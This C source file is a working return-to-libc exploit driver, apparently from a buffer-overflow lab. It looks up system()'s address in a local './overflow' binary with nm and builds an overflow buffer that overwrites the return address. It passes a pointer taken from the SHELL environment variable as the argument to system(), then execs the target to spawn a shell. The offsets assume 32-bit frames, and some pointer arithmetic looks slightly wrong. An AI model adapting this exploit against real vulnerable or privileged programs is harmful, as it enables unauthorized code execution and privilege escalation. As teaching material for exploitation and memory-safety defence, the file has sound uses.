#include <libgen.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFLEN 300

static void hexdump(void * buf, size_t siz)
{
    for (size_t i = 0; i < siz; ++i)
    {
        printf("0x%02X ", ((unsigned char *)buf)[i]);
        if ((i+1) % 10 == 0) printf("\n");
    }
}

static char *
run_command_and_capture_output(char const * const cmd)
{
    FILE *fp;
    char output[BUFSIZ];

    fp = popen(cmd, "r");
    if (fp == NULL) {
        return NULL;
    }
    if (fgets(output, sizeof(output), fp) != NULL) {
        return strdup(output);
    }
    pclose(fp);

    return NULL;
}

int main(int argc, char ** argv)
{
    char * mydir;
    char * system_fn_as_str;
    size_t * system_fn = (size_t *)0xDEADC0DE;
    char cmd_get_system_fn[BUFSIZ];
    char path[BUFSIZ];
    char exploit_buffer[BUFLEN + 8 /* other/padding */
                               + 4 /* saved ebp (stack frame of the calling fn) */
                               + 4 /* return address to main() -> address of system() */
                               + 4
                               + 4 /* first argument for overflow() -> first argument of system() */];

    if (argc != 1)
    {
        exit(1);
    }
    mydir = dirname(strdup(argv[0]));
    chdir(mydir);

    snprintf(cmd_get_system_fn, sizeof(cmd_get_system_fn),
             "nm %s/overflow | grep 'W system' | cut -d ' ' -f 1", mydir);
    printf("Executing $(%s) to get address of system()\n", cmd_get_system_fn);
    system_fn_as_str = run_command_and_capture_output(cmd_get_system_fn);
    if (system_fn_as_str == NULL)
    {
        printf("Could not retrieve system() address.\n");
        exit(1);
    }
    system_fn = (size_t *)strtoul(system_fn_as_str, NULL, 16);

    memset(exploit_buffer, 'A', sizeof(exploit_buffer));
    *(size_t **)&exploit_buffer[BUFLEN + 8 + 4] = system_fn;
    *(size_t **)&exploit_buffer[BUFLEN + 8 + 4 + 4 + 4] = (size_t *)(getenv("SHELL") + strlen("SHELL"));

    printf("\nexploit buffer:\n");
    hexdump(exploit_buffer, sizeof(exploit_buffer));
    printf("\n\n");

    snprintf(path, sizeof(path), "%s", "./overflow");
    printf("Exec......: %s\n"
           "system()..: %p\n"
           "env(SHELL): %p\n\n",
           path, system_fn, getenv("SHELL"));

    printf("All set up, let's have some fun.\n"
           "Executing %s with exploit buffer as argv[1]\n",
           path);
    execl(path, path, exploit_buffer, NULL);
}
